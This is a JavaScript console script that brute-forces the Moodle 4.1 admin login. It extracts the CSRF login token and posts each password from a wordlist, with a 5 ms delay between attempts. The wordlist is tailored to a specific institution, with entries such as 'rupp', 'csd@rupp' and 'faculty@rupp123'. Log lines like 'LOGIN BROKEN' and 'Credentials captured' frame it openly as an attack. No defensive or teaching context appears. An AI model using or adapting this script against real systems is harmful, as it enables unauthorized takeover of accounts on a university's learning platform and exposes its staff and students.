const TARGET = window.location.origin;
const USERNAME = "admin";
const DELAY = 5;

const PASSWORDS = [
  "password", "password123", "Password123", "rupp", "rupp123", "rupp2024",
  "rupp2025", "rupp2026", "123456", "12345678", "admin", "admin123",
  "welcome", "welcome123", "pengkun", "pengkun123", "kunpeng", "1234",
  "000000", "qwerty", "abc123", "iloveyou", "sunshine", "princess",
  "dragon", "football", "baseball", "letmein", "monkey", "shadow",
  "master", "hello123", "computer", "csd123", "csd@rupp", "faculty",
  "faculty123", "teacher", "teacher123", "lecturer", "lecturer123",
  "attendance", "smis", "smis123", "rupp@123", "Rupp@123", "Rupp123!",
  "Password@123", "P@ssw0rd", "P@ssw0rd123", "Cambodia", "Cambodia123",
  "phnompenh", "phnompenh123", "123456789", "123123", "111111",
  "qwerty123", "1q2w3e4r", "password1", "password12", "Password1",
  "Password12", "admin@123", "root", "root123", "toor", "guest", "user",
  "user123", "test", "test123", "demo", "demo123", "123qwe", "qwe123",
  "zxcvbnm", "1qaz2wsx", "qazwsx", "password!", "Password!", "pass123",
  "passw0rd", "passw0rd123", "secret", "secret123", "login", "login123",
  "welcome1", "welcome2024", "welcome2025", "welcome2026", "changeme",
  "changeme123", "default", "default123", "rupp.csd", "rupp.csd123",
  "cs.rupp", "cs.rupp123", "faculty@rupp", "faculty@rupp123", "Admin@123!"
];

let index = 0;
let foundPassword = null;

console.log('%c[ENI]  Moodle 4.1 Brute Force Initiated', 'color: #6366f1; font-size: 18px; font-weight: bold;');
console.log('%c[ENI] Target: ' + TARGET, 'color: #a855f7; font-weight: bold;');
console.log('%c[ENI] Username: ' + USERNAME, 'color: #a855f7; font-weight: bold;');
console.log('%c[ENI] Wordlist: ' + PASSWORDS.length + ' passwords loaded', 'color: #d97706; font-weight: bold;');

async function getLoginToken() {
    try {
        const resp = await fetch(`${TARGET}/login/index.php`, {
            method: 'GET',
            credentials: 'include',
            cache: 'no-store'
        });
        const text = await resp.text();
        const match = text.match(/name="logintoken"\s+value="([^"]+)"/i);
        return match ? match[1] : null;
    } catch (e) {
        console.log('%c[ENI] ⚠️ Token fetch failed: ' + e.message, 'color: #f59e0b;');
        return null;
    }
}

function isStillOnLoginPage(html) {
    
    return html.includes('name="password"') && html.includes('id="password"');
}

async function tryLogin(password) {
    const token = await getLoginToken();
    if (!token) {
        console.log('%c[ENI]  Cannot extract CSRF token. Aborting.', 'color: #dc2626; font-weight: bold;');
        return 'abort';
    }

    const body = new URLSearchParams();
    body.append('username', USERNAME);
    body.append('password', password);
    body.append('logintoken', token);
    body.append('anchor', '');

    try {
        const resp = await fetch(`${TARGET}/login/index.php`, {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': `${TARGET}/login/index.php`
            },
            body: body.toString(),
            redirect: 'follow',
            cache: 'no-store'
        });

        const html = await resp.text();
        const finalUrl = resp.url;

        if (isStillOnLoginPage(html)) {
            console.log(`%c[ENI] ${index + 1}/${PASSWORDS.length}  WRONG: "${password}"`, 'color: #dc2626;');
            return false;
        }

        // ─── SUCCESS ───
        foundPassword = password;
        console.log('%c', 'border-bottom: 3px solid #16a34a;'); // spacer
        console.log('%c[ENI]  SUCCESS! LOGIN BROKEN! ',);
        console.log('%c[ENI]  USERNAME: ' + USERNAME, 'color: #16a34a; font-size: 14px; font-weight: bold;');
        console.log('%c[ENI]  PASSWORD: ' + foundPassword, 'color: #16a34a; font-size: 14px; font-weight: bold; text-decoration: underline;');
        console.log('%c[ENI]  Redirected to: ' + finalUrl, 'color: #16a34a; font-size: 14px;');
        console.log('%c', 'border-bottom: 3px solid #16a34a;'); // spacer
        return true;

    } catch (e) {
        console.log(`%c[ENI] ${index + 1}/${PASSWORDS.length} ⚠️ ERROR with "${password}": ${e.message}`, 'color: #f59e0b;');
        return false;
    }
}

async function run() {
    for (index = 0; index < PASSWORDS.length; index++) {
        const result = await tryLogin(PASSWORDS[index]);
        if (result === 'abort') break;
        if (result === true) {
            console.log('%c[ENI]  Mission complete. Credentials captured.', 'color: #16a34a; font-size: 16px; font-weight: bold;');
            break;
        }
        await new Promise(r => setTimeout(r, DELAY));
    }
    if (index >= PASSWORDS.length && !foundPassword) {
        console.log('%c[ENI] All passwords exhausted. No match.', 'color: #dc2626; font-size: 14px; font-weight: bold;');
    }
}

run();